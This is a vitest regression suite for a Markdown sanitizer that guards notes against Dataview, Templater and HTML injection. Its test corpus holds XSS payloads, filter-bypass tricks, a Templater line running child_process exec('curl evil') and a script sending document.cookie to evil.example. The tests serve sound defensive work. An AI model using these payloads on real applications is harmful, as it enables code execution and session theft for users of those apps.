/**
 * B3 sanitizer hardening — security regressions (plan:
 * .claude/PRPs/plans/b3-sanitizer-hardening.plan.md). Every case here is a
 * confirmed bypass of the pre-hardening sanitizer, plus the invariants the fix
 * must hold: the sanitizer is TOTAL (never throws) and IDEMPOTENT
 * (s(s(x)) === s(x)), and it fails closed when its fixed point is not reached.
 */
import { afterEach, describe, expect, it, vi } from "vitest";

import { sanitizeAndNormalize, sanitizeMarkdown } from "./enrichSanitize";
import { executeChat } from "./llmHttp";

function ideaNote(body: string): string {
  return `---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea, seedling]\n---\n${body}`;
}

const s = sanitizeMarkdown;

// ── Item 1: inline Dataview spans are made inert, not deleted (decision 2) ────

describe("item 1 — inline Dataview spans made inert", () => {
  it("rewrites `= …` to the inert form, keeping the content visible", () => {
    const input = ideaNote("# Title\n\nToday: `= this.file.name` here.\n");
    expect(s(input)).toBe(ideaNote("# Title\n\nToday: `inert: = this.file.name` here.\n"));
  });

  it("covers the inline DataviewJS prefix `$=`", () => {
    const input = ideaNote("# T\n\n`$= dv.el('b', 'pwned')`\n");
    expect(s(input)).toBe(ideaNote("# T\n\n`inert: $= dv.el('b', 'pwned')`\n"));
  });

  it("covers a double-backtick span with a leading space (Dataview trims)", () => {
    expect(s("x `` =this.file.name `` y")).toBe("x ``inert:  =this.file.name `` y");
  });

  it("covers a single-backtick span with a leading space", () => {
    expect(s("a ` =x` b")).toBe("a `inert:  =x` b");
  });

  it("pairs spans instead of matching a regex — `x`=b is not a query", () => {
    const input = "a `x`=b `c` and `k` = `v`";
    expect(s(input)).toBe(input);
  });

  it("honors a backslash-escaped backtick before the real opener", () => {
    // `\`` is a literal backtick, so the NEXT run opens the live `= x` span.
    expect(s("\\` `= x`")).toBe("\\` `inert: = x`");
  });

  it("does not pair across a heading boundary", () => {
    expect(s("# Head `a\n`= x`\n")).toContain("`inert: = x`");
  });

  it("does not pair across a blank line", () => {
    expect(s("x `a\n\n`= evil`\n")).toContain("`inert: = evil`");
  });

  it("catches a span that crosses a soft line break", () => {
    expect(s("`= this\nfile.name`")).toBe("`inert: = this\nfile.name`");
  });

  it("catches a span in a table cell", () => {
    expect(s("| `a | `= x` |\n")).toContain("`inert: = x`");
  });

  it("escapes a raw HTML <code> element (Dataview reads every <code>)", () => {
    const out = s("# T\n\n<code>$= dv.el('b', 'x')</code> and <CODE>= 1</CODE>\n");
    expect(out).not.toMatch(/<code/i);
    expect(out).toContain("&lt;code>$= dv.el('b', 'x')");
  });

  it("leaves a span inside a certain ```js fence byte-for-byte untouched", () => {
    const input = "```js\nconst s = `=${a}`;\n```\n";
    expect(s(input)).toBe(input);
  });
});

// ── Item 3: a fence line in the frontmatter must not hide the body ────────────

describe("item 3 — frontmatter-aware fence scan", () => {
  it("drops a fence line from the header and scans the body from a clean state", () => {
    const input =
      "---\ncreated: 2026-07-04\n```\nstatus: seedling\ntags: [idea]\n---\n# T\n\n```dataviewjs\ndv.pages()\n```\n\n<script>x</script>\n";
    const out = s(input);
    expect(out).toBe(
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\n---\n# T\n\n```text\ndv.pages()\n```\n\n[script removed]\n",
    );
    expect(sanitizeAndNormalize(input, "idea")).toBe(out);
  });

  it("rewrites a loose `----` closer to exactly `---`", () => {
    const input = "---\ncreated: 2026-07-04\n```\n----\n# T\n\n<script>x</script>\n";
    expect(s(input)).toBe("---\ncreated: 2026-07-04\n---\n# T\n\n[script removed]\n");
  });

  it("normalizes CRLF so a ```dataviewjs\\r opener is renamed", () => {
    const input =
      "---\r\ncreated: 2026-07-04\r\nstatus: seedling\r\ntags: [idea]\r\n---\r\n# T\r\n\r\n```dataviewjs\r\ndv.pages()\r\n```\r\n";
    expect(s(input)).toBe(
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\n---\n# T\n\n```text\ndv.pages()\n```\n",
    );
  });

  it("normalizes lone-CR line endings", () => {
    expect(s("# T\r\r```dataviewjs\rdv.pages()\r```\r")).toBe("# T\n\n```text\ndv.pages()\n```\n");
  });
});

// ── Item 4: one pass must not assemble a live construct ───────────────────────

describe("item 4 — fixed point", () => {
  const rows: Array<[string, string, RegExp]> = [
    ["on*= removal joins <sc…ript>", `<sc onx="y"ript>alert(1)</script>`, /<script/i],
    ["on*= removal joins live Templater", `< onx="1"%* tR += "x" %>`, /<%/],
    ["on*= removal joins <svg/onload>", `<svg/on onx="1"load=alert(1)>`, /onload/i],
    ["on*= removal assembles a dataviewjs fence", '`` onx="1"`dataviewjs\ndv.pages()\n```', /```dataviewjs/],
  ];

  for (const [name, input, live] of rows) {
    it(`${name}: no live construct after sanitizing`, () => {
      const out = s(input);
      expect(out).not.toMatch(live);
      expect(s(out)).toBe(out);
    });
  }

  /** Each pass strips one `on*=` layer and exposes the next one. */
  function nested(depth: number): string {
    return `<img src=x${" o".repeat(depth)} onq='z'${"nx='z'".repeat(depth)}nx=alert(1)>`;
  }

  it("converges for shallow nesting without failing closed", () => {
    const out = s(`# T\n\n${nested(2)}\n`);
    expect(out).not.toMatch(/on[a-z]+\s*=/i);
    expect(out).toContain("<img src=x");
    expect(s(out)).toBe(out);
  });

  it("fails CLOSED when the pass cap is hit — never returns the last iteration", () => {
    const out = s(`# T\n\n${nested(12)}\n`);
    expect(out).not.toContain("<");
    expect(out).toContain("&lt;img src=x");
    expect(out).not.toMatch(/on[a-z]+\s*=/i);
    expect(s(out)).toBe(out);
  });
});

// ── Extras (decision 3) ───────────────────────────────────────────────────────

describe("extras — fences in containers, fake openers, quote-delimited on*=", () => {
  it("renames executable fences after a list marker or a callout `>`", () => {
    const input = "- ```dataviewjs\n  dv.x()\n  ```\n\n> ```dataview\n> LIST\n> ```\n\n> - 1. ~~~DataviewJS\n";
    expect(s(input)).toBe(
      "- ```text\n  dv.x()\n  ```\n\n> ```text\n> LIST\n> ```\n\n> - 1. ~~~text\n",
    );
  });

  it("a 4-space-indented ``` is not a fence opener (it hid what followed)", () => {
    expect(s("# T\n\n    ```\n<script>alert(1)</script>\n")).not.toContain("<script");
  });

  it("a backtick fence with a backtick in its info string is not an opener", () => {
    expect(s("# T\n\n```a`b\n<script>alert(1)</script>\n")).not.toContain("<script");
  });

  it("a fence in a list item closes when the item does (dedented line)", () => {
    expect(s("- a\n  ```js\n<script>x</script>\n  ```\n")).not.toContain("<script");
  });

  it("a fence line inside an HTML block is HTML, not a fence opener", () => {
    expect(s("<div>\n```js\n<img src=x onerror=alert(1)>\n```\n")).not.toMatch(/onerror/i);
  });

  it("strips an on*= attribute glued to a closing quote — src=\"x\"onerror=", () => {
    expect(s(`# T\n\n<img src="x"onerror="alert(1)">\n`)).toBe(`# T\n\n<img src="x">\n`);
  });
});

// ── Item 2: model-emitted frontmatter keys are allowlisted on BOTH branches ───

describe("item 2 — strict frontmatter allowlist on executeChat's two branches", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  async function chat(content: string): Promise<string> {
    const body = JSON.stringify({ model: "m", choices: [{ message: { role: "assistant", content } }] });
    vi.stubGlobal("fetch", vi.fn().mockResolvedValue(new Response(body, { status: 200 })));
    const { markdown } = await executeChat(
      "https://llm.example.com",
      "k",
      "m",
      [{ role: "user", content: "x" }],
      "idea",
      "Test",
    );
    return markdown;
  }

  it.fails("compliant branch drops extra keys (dg-publish, publish, cssclasses)", async () => {
    const md = await chat(
      "---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\ndg-publish: true\npublish: true\ncssclasses: [x]\n---\n# T\n",
    );
    expect(md).toBe("---\ncreated: 2026-07-04\nstatus: seedling\ntags: [idea]\n---\n# T\n");
  });

  it.fails("fallback branch (missing required `status`) drops extra keys too", async () => {
    const md = await chat("---\ncreated: 2026-07-04\ntags: [idea]\ndg-publish: true\n---\n# T\n");
    expect(md).toBe("---\ncreated: 2026-07-04\ntags: [idea]\n---\n# T\n");
  });

  it.fails("fallback branch denies quoted, explicit and spaced key forms", async () => {
    const md = await chat(
      '---\ncreated: 2026-07-04\ntags:\n  - idea\n"dg-publish": true\n? publish\n: true\ndg publish: true\ncssclasses : [x]\n---\n# T\n',
    );
    expect(md).toBe("---\ncreated: 2026-07-04\ntags:\n  - idea\n---\n# T\n");
  });

  it("sanitizeMarkdown alone keeps app-written stub keys (source/mime/size)", () => {
    const stub =
      '---\ncreated: 2026-09-30\nkind: shared-audio\nsource: "memo.m4a"\nmime: "audio/mp4"\nsize: 12\ntags: [shared, audio]\n---\n# Shared audio\n';
    expect(s(stub)).toBe(stub);
  });
});

// ── Invariants: total + idempotent over the corpus and a seeded fuzz ──────────

const CORPUS: string[] = [
  ideaNote("# Title\n\n```dataviewjs\ndv.pages().file.tasks\n```\n"),
  ideaNote("# Title\n\n```dataview\nLIST FROM #idea\n```\n"),
  ideaNote("# Title\n\nToday: `= this.file.name` here.\n"),
  ideaNote("# Title\n\n```dataviewjs\n<%* const {exec}=require('child_process'); exec('curl evil') %>\n```\n"),
  ideaNote("# Title\n\n```js\nconst x = 1; // <%= tp.file.title %>\n```\n"),
  ideaNote("# Title\n\nDate: <%= tp.date.now() %>\n"),
  ideaNote("# Title\n\n<script>fetch('https://evil.example/'+document.cookie)</script>\n"),
  ideaNote(`# Title\n\n<img src="x" onerror="alert(1)">\n`),
  ideaNote("# Title\n\n<svg/onload=alert(1)>\n"),
  ideaNote("# Title\n\n<img/onerror=x src=y>\n"),
  ideaNote("# Title\n\n[click](javascript:alert(1))\n"),
  ideaNote("# Title\n\n[dl](data:text/html;base64,PHNjcmlwdD4=)\n"),
  ideaNote("# Title\n\n![text](data:text/html;base64,PHNjcmlwdD4=)\n"),
  "# Note\n\n## Actions\n- [ ] email Sam about the venue\n- [x] book the flight",
  "```js\nconst el = document.querySelector('#app');\nel.innerHTML = '<script>noop</script>';\n```",
  "```html\n<script>alert('doc')</script>\n<a href=\"javascript:void(0)\">x</a>\n```",
  "# Summary\n\nlocation: 48.8566,2.3522\n\n---\n\n## 14:00\n- did another thing",
  "---\ndate: 2026-07-04\ntags: [journal, work]\npeople: [[[Ada]]]\nideas: []\n---\n# Busy day\n",
  `<sc onx="y"ript>alert(1)</script>`,
  `< onx="1"%* tR += "x" %>`,
  `<svg/on onx="1"load=alert(1)>`,
  '`` onx="1"`dataviewjs\ndv.pages()\n```',
  "---\ncreated: 2026-07-04\n```\n----\n# T\n\n<script>x</script>\n",
  "# T\r\r```dataviewjs\rdv.pages()\r```\r",
  "a `x`=b `c` and `` =y `` \\` `= z`",
  `<img src=x${" o".repeat(12)} onq='z'${"nx='z'".repeat(12)}nx=alert(1)>`,
];

/** Deterministic LCG so a failure is reproducible from its seed. */
function fuzzInputs(count: number, seed: number): string[] {
  const alphabet = [
    "<", ">", "%", "`", "``", "```", "~~~", "\\", "on", "onx=", " ", "\n", "\r", "\n\n",
    "=", "$=", '"', "'", "-", "---", "> ", "- ", "script", "dataviewjs", "code", "|",
    "javascript:", "](", "[a", "!", "data:", "x", "    ", "#", "%%", "<div>", "</",
  ];
  let state = seed >>> 0;
  const next = (): number => {
    state = (Math.imul(state, 1664525) + 1013904223) >>> 0;
    return state;
  };
  return Array.from({ length: count }, () => {
    const len = next() % 40;
    return Array.from({ length: len }, () => alphabet[next() % alphabet.length]).join("");
  });
}

describe("invariants — total and idempotent", () => {
  it("s(s(x)) === s(x) over the sanitizer corpus", () => {
    for (const input of CORPUS) {
      const once = s(input);
      expect(s(once), JSON.stringify(input)).toBe(once);
    }
  });

  it("never throws and is idempotent over 2000 seeded fuzz inputs", () => {
    for (const input of fuzzInputs(2000, 0xb3)) {
      const once = s(input);
      expect(s(once), JSON.stringify(input)).toBe(once);
      expect(once).not.toMatch(/<%[\s\S]*?%>/); // a closed Templater tag
      // No executable fence opener survives on any line, behind any prefix.
      expect(once).not.toMatch(/^(?:[^\S\n]|>|[-*+]|\d{1,9}[.)])*(?:`{3,}|~{3,})[^\S\n]*dataview(?:js)?(?:[^\S\n]|$)/im);
    }
  });
});
